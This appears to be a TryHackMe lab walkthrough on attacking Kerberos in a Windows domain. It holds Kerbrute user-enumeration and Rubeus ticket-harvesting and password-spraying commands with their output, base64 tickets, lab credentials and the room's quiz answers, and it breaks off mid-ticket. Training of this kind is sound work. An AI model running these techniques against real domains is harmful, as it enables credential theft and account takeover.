# Attacking Kerberos

Learn how to abuse the Kerberos Ticket Granting Service inside of a Windows Domain Controller

[Attacking Kerberos](https://tryhackme.com/room/attackingkerberos)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Introduction

This room will cover all of the basics of attacking Kerberos the windows ticket-granting service; we'll cover the following:

- Initial enumeration using tools like Kerbrute and Rubeus
- Kerberoasting
- AS-REP Roasting with Rubeus and Impacket
- Golden/Silver Ticket Attacks
- Pass the Ticket
- Skeleton key attacks using mimikatz

This room will be related to very real-world applications and will most likely not help with any CTFs however it will give you great starting knowledge of how to escalate your privileges to a domain admin by attacking Kerberos and allow you to take over and control a network.

It is recommended to have knowledge of general post-exploitation, active directory basics, and windows command line to be successful with this room.

**What is Kerberos? -**

Kerberos is the default authentication service for Microsoft Windows domains. It is intended to be more "secure" than NTLM by using third party ticket authorization as well as stronger encryption. Even though NTLM has a lot more attack vectors to choose from Kerberos still has a handful of underlying vulnerabilities just like NTLM that we can use to our advantage.

**Common Terminology -**

- **Ticket Granting Ticket (TGT)** - A ticket-granting ticket is an authentication ticket used to request service tickets from the TGS for specific resources from the domain.
- **Key Distribution Center (KDC)** - The Key Distribution Center is a service for issuing TGTs and service tickets that consist of the Authentication Service and the Ticket Granting Service.
- **Authentication Service (AS)** - The Authentication Service issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets.
- **Ticket Granting Service (TGS)** - The Ticket Granting Service takes the TGT and returns a ticket to a machine on the domain.
- **Service Principal Name (SPN)** - A Service Principal Name is an identifier given to a service instance to associate a service instance with a domain service account. Windows requires that services have a domain service account which is why a service needs an SPN set.
- **KDC Long Term Secret Key (KDC LT Key)** - The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.
- **Client Long Term Secret Key (Client LT Key)** - The client key is based on the computer or service account. It is used to check the encrypted timestamp and encrypt the session key.
- **Service Long Term Secret Key (Service LT Key)** - The service key is based on the service account. It is used to encrypt the service portion of the service ticket and sign the PAC.
- **Session Key** - Issued by the KDC when a TGT is issued. The user will provide the session key to the KDC along with the TGT when requesting a service ticket.
- **Privilege Attribute Certificate (PAC)** - The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

**AS-REQ w/ Pre-Authentication In Detail -**

The AS-REQ step in Kerberos authentication starts when a user requests a TGT from the KDC. In order to validate the user and create a TGT for the user, the KDC must follow these exact steps. The first step is for the user to encrypt a timestamp NT hash and send it to the AS. The KDC attempts to decrypt the timestamp using the NT hash from the user, if successful the KDC will issue a TGT as well as a session key for the user.

**Ticket Granting Ticket Contents -**

In order to understand how the service tickets get created and validated, we need to start with where the tickets come from; the TGT is provided by the user to the KDC, in return, the KDC validates the TGT and returns a service ticket.

![](https://i.imgur.com/QFeXDN0.png)

**Service Ticket Contents -**

To understand how Kerberos authentication works you first need to understand what these tickets contain and how they're validated. A service ticket contains two portions: the service provided portion and the user-provided portion. I'll break it down into what each portion contains.

- Service Portion: User Details, Session Key, Encrypts the ticket with the service account NTLM hash.
- User Portion: Validity Timestamp, Session Key, Encrypts with the TGT session key.

![](https://i.imgur.com/kUqrVBa.png)

**Kerberos Authentication Overview -**

![](https://i.imgur.com/VRr2B6w.png)

- AS-REQ - 1.) The client requests an Authentication Ticket or Ticket Granting Ticket (TGT).
- AS-REP - 2.) The Key Distribution Center verifies the client and sends back an encrypted TGT.
- TGS-REQ - 3.) The client sends the encrypted TGT to the Ticket Granting Server (TGS) with the Service Principal Name (SPN) of the service the client wants to access.
- TGS-REP - 4.) The Key Distribution Center (KDC) verifies the TGT of the user and that the user has access to the service, then sends a valid session key for the service to the client.
- AP-REQ - 5.) The client requests the service and sends the valid session key to prove the user has access.
- AP-REP - 6.) The service grants access

**Kerberos Tickets Overview -**

The main ticket that you will see is a ticket-granting ticket these can come in various forms such as a .kirbi for Rubeus .ccache for Impacket. The main ticket that you will see is a .kirbi ticket. A ticket is typically base64 encoded and can be used for various attacks. The ticket-granting ticket is only used with the KDC in order to get service tickets. Once you give the TGT the server then gets the User details, session key, and then encrypts the ticket with the service account NTLM hash. Your TGT then gives the encrypted timestamp, session key, and the encrypted TGT. The KDC will then authenticate the TGT and give back a service ticket for the requested service. A normal TGT will only work with that given service account that is connected to it however a KRBTGT allows you to get any service ticket that you want allowing you to access anything on the domain that you want.

**Attack Privilege Requirements -**

- Kerbrute Enumeration - No domain access required
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required
- Golden Ticket - Full domain compromise (domain admin) required
- Silver Ticket - Service hash required
- Skeleton Key - Full domain compromise (domain admin) required

To start this room deploy the machine and start the next section on enumeration w/ Kerbrute

This Machine can take up to 10 minutes to boot and up to 5 minutes to SSH or RDP into the machine

What does TGT stand for?

`Ticket Granting Ticket`

What does SPN stand for?

`Service Principal Name`

What does PAC stand for?

`Privilege Attribute Certificate`

What two services make up the KDC?

`AS, TGS`

Deploy the Machine

`No answer needed`

## Task 2 Enumeration w/ Kerbrute

Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.

For more information on enumeration using Kerbrute check out the Attacktive Directory room by Sq00ky - https://tryhackme.com/room/attacktivedirectory

You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - `MACHINE_IP CONTROLLER.local`

**Abusing Pre-Authentication Overview -**

By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

**Kerbrute Installation -**

1. Download a precompiled binary for your OS - https://github.com/ropnop/kerbrute/releases
2. Rename kerbrute_linux_amd64 to kerbrute
3. chmod +x kerbrute - make kerbrute executable

**Enumerating Users w/ Kerbrute -**

Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.

1. cd into the directory that you put Kerbrute
2. Download the wordlist to enumerate with here
3. ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt - This will brute force user accounts from a domain controller using a supplied wordlist

![](https://i.imgur.com/fSDrhyb.png)

Now enumerate on your own and find the rest of the users and more importantly service accounts.

```
kali@kali:~/CTFs/tryhackme/Attacking Kerberos$ sudo /opt/kerbrute/dist/kerbrute_linux_amd64 userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (1ad284a) - 11/24/20 - Ronnie Flathers @ropnop

2020/11/24 19:04:20 >  Using KDC(s):
2020/11/24 19:04:20 >   CONTROLLER.local:88

2020/11/24 19:04:20 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2020/11/24 19:04:20 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2020/11/24 19:04:20 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2020/11/24 19:04:21 >  [+] VALID USERNAME:       user3@CONTROLLER.local
2020/11/24 19:04:21 >  Done! Tested 100 usernames (10 valid) in 0.406 seconds
```

How many total users do we enumerate?

`10`

What is the SQL service account name?

`sqlservice`

What is the second "machine" account name?

`machine2`

What is the third "user" account name?

`user3`

## Task 3 Harvesting & Brute-Forcing Tickets w/ Rubeus

To start this task you will need to RDP or SSH into the machine your credentials are -

Username: Administrator
Password: P@$$W0rd
Domain: controller.local

Your Machine IP is 10.10.197.112

Rubeus is a powerful tool for attacking Kerberos. Rubeus is an adaptation of the kekeo tool and developed by HarmJ0y the very well known active directory guru.

Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.

The tool has way too many attacks and features for me to cover all of them so I'll be covering only the ones I think are most crucial to understand how to attack Kerberos however I encourage you to research and learn more about Rubeus and its whole host of attacks and features here - https://github.com/GhostPack/Rubeus

Rubeus is already compiled and on the target machine.

**Harvesting Tickets w/ Rubeus -**

Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

1. cd Downloads - navigate to the directory Rubeus is in
2. Rubeus.exe harvest /interval:30 - This command tells Rubeus to harvest for TGTs every 30 seconds

![](https://i.imgur.com/VCeyyn9.png)

```
PS C:\Users\Administrator\Downloads> . .\Rubeus.exe harvest /interval:30

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Harvesting (with auto-renewal)
[*] Monitoring every 30 seconds for new TGTs
[*] Displaying the working TGT cache every 30 seconds


[*] Refreshing TGT ticket cache (11/24/2020 10:13:48 AM)

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  11/24/2020 9:51:54 AM
  EndTime               :  11/24/2020 7:51:54 PM
  RenewTill             :  12/1/2020 9:51:54 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEmsRC7+jJ99OVgZgCd8qWTwVAep5/lCAvc+d
    9CA91R/0H2Bbjxqhd3A3NXph4XMKQ98K+Q5IZyZEh1Vbb4t1BeXaZfvZsZ9198RzSMQy7TmUR3Bk2Wl3UiK5ZI3wEo980jhF9mYo
    j0tRTMEaf3KQ9tpZSNoYDIXa1by6ZuvLRxQIN/AWpWWwLxyGmYt5n3cV1kglUUHSfC17vjMT3G011TesjWl9Y8I05ccfUUCsPQhF
    cu/2T9bL02Hr6kZg28msIeKLz4A39d/9IEQJ7xqbSbMKFJSjbYtL9au0JDp6Dylkha/hY3F39ejI/nZ2Uo/QdKCDEDLIl+E7xOfU
    YrcHBcRbfP8taKYZjBcKQTbfCK6gj3sv7q8/+YQz8GT1Uii7tbtosC9XcnHmgVhWHBsHIu/mX2UnuEBPYIG3/nJ/PIArrppwHgrf
    4yaG/HvfqBoTGEm1zokKbgKMH0j71vy26NnMbozOK+FaOyJDEshhCBNi72QFwgEW5FWh3TNjfm+0mXslEglxwunTKyZsUzmu8SIJ
    Dc3PG2KVeYhWwQLSOzYOuiT2mL2Xf1mKA/3xx4fuA5miq+EYeOQQZK06wyQ3fFk+phohiGhoEL/tQk/w8MzI3YSZgDPCDNkuP2m1
    0hOIE0ppoULjuYll4SX66ZxxcQeeL3WpFOpEL7+D80nJ1eCSj6FEybilL98rmIhQNzWgkmzIpohlL7yMs/InSLnn5WBE8Q4JokOn
    xeUVjmFsA57Hm0l7LYwgviHFPOABwvAXvat7LnjuFP812GYz6+9EI3WXBKoEpXCrHE7iElgSSussQ5dl3buCUytV3bm+tpee0nHy
    MF40S/sC9Hp0Ow7JbACaChJ/Qhw+Y1mdw4M0xnPYgqF6e0/TgJhwVdtsJdyC1qhm7ns/u8EvbDbSVh6V6KO+ASSqqBMrM/L1jIwa
    OxspZYIzCsXUq9pK9AVswgBomfeiHhh/hgLc1wixhQPLObqAxPeXHVOR9Bp5/VC3nghRDtk3helCib6PNlkGBFMXGCxkRQm/qK2n
    tlxzU/fcbjWSfn3YuISSIb2oCk9qRCip/E9LEBsXqFs42rILmNCNHNQ+qLhm44Ozsk106zsxNmSmjopN9GdkvEoOXTGleR/27QG6
    NL0mhfFrU82SI/W+OFDHPCuHvlSUxIn5kLQwtAiYysLbTLJ1ogkcn4rATCAPNReORB1opfQ18wQXhtnE7LNDTJrn1jBxh3IH9USP
    UAvCyj4EUUTnHcVpWAql1oKhJacU03BO5MyyMR3aTZ+Nuv1NpS6ya4eGVfEybgmIJm6ehDZSdREKVcfynEih/JBKlup19MA2T0Hf
    GV5zDDomPqEF8SSU08Obc+IBnQJrH92EpXiXyFxEaydiK1i/UQCPDL+jgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCAbKMcq9MSAblIzQXUMMNyVJin9MFZSU0f/Lll/8M3rhqESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIwMTEyNDE3NTE1NFqmERgPMjAyMDExMjUwMzUxNTRapxEYDzIwMjAxMjAx
    MTc1MTU0WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  11/24/2020 9:51:54 AM
  EndTime               :  11/24/2020 7:51:54 PM
  RenewTill             :  12/1/2020 9:51:54 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEkqFv9OQHSxUasngd8Sad9FcZyEdWtkBl14X
    zZFrbNxqYUX1x0bYI23FNzPZ7IjP5l/sDEpzujROcyOLGwIDbU+nnpEiVduu0iIo3xd3PfNnqdFuEWV8VXE6RVzz15xUiUqtIe5u
    v55P4JYpYYxEM2bByMbmH17t06DUnrlxwzZR0bt3F2hUVBKxesfRyyzunnyb+lhHKHFt92/9xyapqnJYlOUpz7l1MV1du4dRgW+W
    zzG17xZAcP7wB3DAOqOTeHeQzVes/1v1fszb7zc/hgY/2A7fBosMivjTBrLQAXwT2uwLjd1cqXJECrWVGd9TkizJGor1Om368fl1
    hctfbdIQXatySTB8pdMnjR6/at4CtafoFddRVzC4258V3qgTaEisOVsa/c+LFBU1RY+QbgNEiPV4fdxdqM68heW1ixoPQCey/IWo
    TAbAGtDoO1k5kgKDvkt7gqbddh/b4c6SZ/ImtFoE4HzdUNs6BiwazMMNcPZIuNj0RB+uf/PPZfFjCI5gGgfvF67zwHijc140sSHf
    YLwHhUgZpqJhH+X6NJYo9eMsAmWIlRF7qCL1rcA7CyLlJ6O4hy/hq6vOej+nTQMs7+9ZDBq+9WNSboc+JAa4wqmOBRiugTQRoSjQ
    b26UxUCofx7pVZ36odg3fgIDCRcn2j6cDbAQfr6pGbGWTNSCaC3sGfM6og9ix4O7mpOYP3oVFOLAMXLZXJNYJ/NIzgema3o5hbPi
    KSEbx3YM6znGGmfSxb2Gvz4AsJydXSt/vBHo8R4pvUcCJtJyCocKJ9Fjm1e8e3PLIT1J50PDZ49Ug6NKKo6MYmnxgMhOa4qvavVz
    9TsdG3dEmtYT8woeqND2nrQmDcpCN1fNfO2JQzsDVyr93HB5x4GxVWEkXn5Nx3M42mggh1fB3tpwBCDoqdaHATAzfs8faqJs6jPf
    f+4C8QpC3SAlq96R+6zzA034JmEIRZZ5qfq2SiOidaMjcRsWx2TRp/7UWDPtAbFhCTF4memzBJbXHv/HVG64K9sCMwn2QeduR8Pl
    pvVudqzWtHhIXFVYEm0rW7waN9fpTQK6BeTXQGDtozWphJO12Q91M2TC/AjcsKa3L69pcB7+6Ltxuz5Odc4ESl0F2tF3HLzROglC
    IPvtnoXKq22/txFPRLknPBKN+IykT+czvVYmYv1bprg46Z65pDG9GhUBgj+JvB7dwHMFkP8R2NJImAbDZWir2S6csxnXt3YnzFm3
    jUyhVkTR/j1oOurMQJeU0aiD6wJvg4RdIbvrQiDffGG5RAaYgm9UKvXNfJi3cvZR8KxldsRcQ1p03fVFmsh9PVMogQv28gejOIYy
    YNPHKvF78rxW8w08+ZBcE9SoMqzPlDJoqODeOtL4ODAq/IEZOVu2iymjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCAmWcvHG5m+ZHTaLM1LwwvgzHrXc3AphwzGH2TZVepXAKESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAYKEAAKURGA8yMDIwMTEyNDE3NTE1NFqmERgPMjAyMDExMjUwMzUxNTRapxEYDzIwMjAxMjAx
    MTc1MTU0WqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  11/24/2020 9:53:13 AM
  EndTime               :  11/24/2020 7:53:13 PM
  RenewTill             :  12/1/2020 9:53:13 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEoBNqOXXxpDzAuWnaFE0XoG6jPMPxZ9R07X/
    XixhhBn1tzlS2xSz6M0z1pgj3+vJodQ4yfLf9YFF2+Ie4tQeuRkxiieJ/15iU0s/TwYSYGbc2G8aE30SPxLpPnJKNvjUtl6L8QU5
    6jGcq+OErnzldw6bGq7yzbGhBA0PMbIQK2NUfxueICSK7agEJeDrkgpTxdEdZ/VbMa7tqbpNbP/qfLLr0rHTukmrxu+Dz9N/wVF0
    q3c8E5U5BSJpxJhuy0rHfc4+O2Un8mv7QQUPQ5rjhQtrYKqQSDIT8cVNfmN/P5WVQp+xQQJg7ttYwl1ihoNxa05z3+eCU106Knyt
    uSNuIofvrKahaiWd0kYqkxT2fpDC7tpXMCna3M3zK7dzAlR+AZWOPE8B6eyWjeXPFLa9SDHfw51vizNrR8kj7HY8cBcFLxfYgwGd
    VSY5kwk986RapeUMt+rCTHmxjXOtyxKGJk+pAn0260M2w0GeMRzWzznEn2nr/lXPowtRXqwmDKWZNbVFpZqvMfE80+pmp/FNSmkO
    R1gwyOkwfmOAe/JuVQOI+dn7wSr4hnsikN2jDFGItArf/lc4F1Qjcs5BFF8z1MgU8mhPWsJf2keK7G7b+eBISdBn5zH0uDjR+UJH
    v0BHwXmXDONuY/Oxk5S7rE6RWUD5ClX2UI1RQwzGdfDz0XEHi2k2fdzncPo6wGXWMA4OrL6MCyX4ZyHeAMXeOcJYutj8DdnE1Aj/
    sHxpOezFSU29W+gUew0qZsMU8NvYZ4Dq0THG6CkqGfHOuZDs3+lG1kkxjVWAzfexb3ft/GeFi8Gpbkt/zGLyUaFXi0HCXLhE9kwL
    4xeXz8Sli0oKRR96QZEmwufNApEVRai35eEidz7Ri+WWuZCWLAsKCteqvbFgLU4oqdYpKRM0PmYCs1h80ujdjqYLsKflLnfkOeDU
    5eCSg2iT+C4RCRsxr9IGZuoMveLiTwNjemcESsF3HZxobO9fYyAvlzudU6C+9cW0khGtEXa3/15oBO6MyExLBPPKZF2SjkOHgwph
    lJx+rZ2+VMuUYrMtXt+LucZuFhhpXgq5HRiRI5OwPLKPbNuNk9nj0Hw8+Dw/ukLg4tgnr0FRnpEN989YuqYlr2pimLV8wFCoBM7d
    JJVJht59VsEjmPF55CXjTjlg9byikbWkUw7aR+hsBk1N5P5pdMcLIbJMTFTp1uIzIRZ8T4dlW0La0ORjX6Nppei5bdHuD9tstmqR
    WV/1moTfOEQ+m/SGL18ikK/TDrk4blN0aLy57lmoeDsjYy/I0OTt1Yh+R7NpQu4umGXqSeJCLJF1+KDo0gjJFlOCuX9UszPXJmhB
    5ggKmA0UNtfpEUzvZtTjFFyXqSjLNiWOS+6EmmWArUqc5VyQhPKC37mjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCALYnQd1uxNjQJlx9sjnnDpE0ZXFt4HjqhmFWu4XtdvnqESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIwMTEyNDE3NTMxM1qmERgPMjAyMDExMjUwMzUzMTNapxEYDzIwMjAxMjAx
    MTc1MzEzWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM

  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  11/24/2020 10:11:43 AM
  EndTime               :  11/24/2020 8:11:43 PM
  RenewTill             :  12/1/2020 10:11:43 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFjDCCBYigAwIBBaEDAgEWooIEgDCCBHxhggR4MIIEdKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQwMIIELKADAgESoQMCAQKiggQeBIIEGhb1UXo2DBjgJyjcyrm5wwGV6uU/DS4rmsl2
    5XL7+Im7im9G3s4BQecOCSpOHC2OLZK7mWYZsOuZ3J9fnfNgo3STRB7yk9iaRJFCOBzd6gg7GPGrgD5Jecqrra2pxXDZfqNpr7KI
    7HlZizJGYbiIMg+u5jDhZDu8ONxyuJfKKqecKqd6EgcK2rmRxRiDWOgIzfbpFIEBYfjrPTMjKZikJZpdccyHcO8h9oyKQhegtQ6A
    77wXj6fVmwa5RYH+ODPl/xU2WnyOG2InIlVZ19w7s8Mxue2fSbvEK+ymUbvE5QIKMa5CKxXx+JDYvceEdmyGfS7L6zVRIezPkJYr
    5gtqpDb7OVEnutEh8GMxaVOUCOOjbrTaU9u9IdAjB8lUn7Pcd1BR5MHrSWpbTXJQbCAbOnthTOP3NLxyHudcQUD75wNAOSDFupkl
    RbRdnh5ULjVefrLEAvJzBdjfpAA8ANEZzKn0wXt0+l5HqqZz8f2K7lyELL4vQzV1gNen97uvzH2eGoo25T9kzwg9XEJ3z/6M6m1y
    FNNxT7RcpzEV2FA5kNVKlj9tV6i4t0Hp8gOHMtWB4GRiyTkTPStGIVL0Y9eXo6V/zWg706VMWJJfP2R4fyzvZ18pICLY2+JmfEEt
    OFyLmcApHEVqPQwCRSAOQ4wdiBXG8m2a+Q1901u684QGmpdBouj256jLEJJ8zZl77Sy3sjoKO7f3n5K1vmcjInpm2BEy0LyTH1IA
    NlrZMFzKfCaCCczx05EsnFzxSYBWN+bt3db3GuIcSBvil6WDumKPFIB7msEh7JACFppOFEoLYR99qPWPQEG2/8+WykpBnOUmr1eu
    slgxzezgNLnfPm1BqQbUuhdJWrsRXJtrN+cySNY714ZU6EnlG8UYAtRe4Lrcdw8jifxPbFP0S8OpEdDGyNCRN+nm6fCbp6lcF1om
    rZBdCW81mIeHs1BijPz1p9jXKZ6Wt4FFplGnOEU/6ftyRCPPMbNRWcTl4227upZVXPi1QbWerE0nXnIftypb/rXuV6LZOlftj0EF
    rP9B3M4V60xnyCeiL0chNUKjuVS0yOZGKX7W4QXxYE19Lltw+abzQX2rkiXTto6vQW27eKpVEgZLdqah6Zr791EHwarN+BU4uV5A
    ogRV24Hl0Tg2FUJYPaQ6gkNPZVlHibi/UrP5sLX6yTtz0+hUwjPYp/rEw2BDuN4V2i4MTwSOFs5S+OsiceHnYhJNbsGZDQBvvrN6
    4qp++2BIxXpiOL2p/30etlr2e/TW+iSxopsCXZrBDdtvxLWF9zExreJuV1KGvnEs4rBbfGT8E7VovFWbsE1ZeMFxl+geW1RkTkZq
    XhtpGZQd4qCD8Nl3wSqe6kT015aZ97RorVWARY7j0tJfvVtT1X4rD2KBFDOCr5Fv/6OB9zCB9KADAgEAooHsBIHpfYHmMIHjoIHg
    MIHdMIHaoCswKaADAgESoSIEIAwaEvwKsu59ZTbpo8wqbqi2tePVzyrA4r/JU8tpVjueoRIbEENPTlRST0xMRVIuTE9DQUyiGjAY
    oAMCAQGhETAPGw1BZG1pbmlzdHJhdG9yowcDBQBA4QAApREYDzIwMjAxMTI0MTgxMTQzWqYRGA8yMDIwMTEyNTA0MTE0M1qnERgP
    MjAyMDEyMDExODExNDNaqBIbEENPTlRST0xMRVIuTE9DQUypJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIuTE9DQUw=

[*] Ticket cache size: 4
[*] Sleeping until 11/24/2020 10:14:18 AM (30 seconds) for next display
```

**Brute-Forcing / Password-Spraying w/ Rubeus -**

Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.

This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command:

`echo 10.10.197.112 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`

1. `cd Downloads` - navigate to the directory Rubeus is in
2. `Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user

![](https://i.imgur.com/WN4zVo5.png)

```
PS C:\Users\Administrator\Downloads> .\Rubeus.exe brute /password:Password1 /noticket

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):

      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7c/dD/Uk29V0bW3A/MtKF2SNy/q1xcx6Uz30gn3Jv/kQ0Jqpm6apEdSVbzkicxr7pAZbarA2a/99
      I2EhuJaG3yvDW1cceUHVfNvjnVnY00j68bnQZrPfmCqziEbNi1oeAKJ6Z6Seu7MFWbmIvwlHIuodIupP
      OuzE8Yhk4sguC69uzNHv5uj2uCceuNBuWTaz3h2ku2VioOcb60uR7NRRhSjImVHfXf/SFIEOdpqHwaDI
      hIvAHJmNeqDZnk88gwzoN2N0OEnOFHtMs276x4ObQ62l/IZuEGZK8pPAEeatnjd+EbKigq4Qp+xk1zjt
      PpNIJU04RtHHDEjouYgkzfHUOO9FCIk6MqQCMhWTdfiCpUnGe6mhhgrRxx465KRK/0FlrtC23PZOLNPC
      bflq0ja7JdFGXlcgsphfNVPFkvTt8aoyDXXEAR17fXufguqH22I2vIw5lIw2A+WFn4ym7kijctqTE6gk
      lZwN4C9FsLG67EmpZizCz5sEUa9GKzsFdEraWTd677sCxZ7gBW4JqCE5uYvyhhwsuu/9D1D9FBckOHjM
      IDvcSBSwtZe20vhe4SkgI3PhKI3bTl6GU1fPJzolYHZiZazw/Qu14+FGSo/UZJw1SDMidIqGgTIOCimy
      NcEIGmxuOyWPPEtUSigLX8naeEZ0rJV4PfN17wKQmT0Qf/zwps6F3vocfmmedwJEhsK1L7e9HkAsWngB
      ZIYvjCzqfBmdFjXzNnCS+BAOlukui5jhuDdJ18ib5rP3VVJDeJZdMefb2N8zswR34X5mv3buTmJsWNYa
      tb96Y3s9vdfxKlGfqz1Jnap07Zyat6FB2uogTZAryBO1dBh19tcM5et4wG9YrnrObjjPgVCr+AKHRH4v
      pYXJnzeMmsYL8V1sWczuWXnW4BHTxRQe7Z2yL3MjqpAkT1ReApDaCpDyIqxBnFOVtWln7EmXjK3adh/X
      o31zJizDirVEONH9EI3j/2xobpup8TGE1juGNJ020LHpYK/1EtCc6IFfEqQqw9nC5cOUauRjsMd9yLED
      KdLjhHtL2b2/llHlrr2j1IsvdkS8AGWwC2KZXfPXHKf768r0eLYjQfN76s7QAmijwxErHwHedkHyiyJn
      lT4+iBl2EM/pZ0BSXIirzt80nYE3UlWsWlrF/iMEkbaGdRatA8QZMLAdcFtWgRpB7srXw/LamNZVWC+s
      GfinpTGIFbmhABCHTbkCHUN48KeC7ShsCeD5FN1kHAFvjC6iyiCsW3r6DA6t/+1OTbE13lU43Z2BTuFZ
      dl8Z/cJXthaK8p9hrm6xA6J9q/79G8f60kWuHIqCd8TAAKFGjgj1JWpY5JLf/E3AbaOB8jCB76ADAgEA
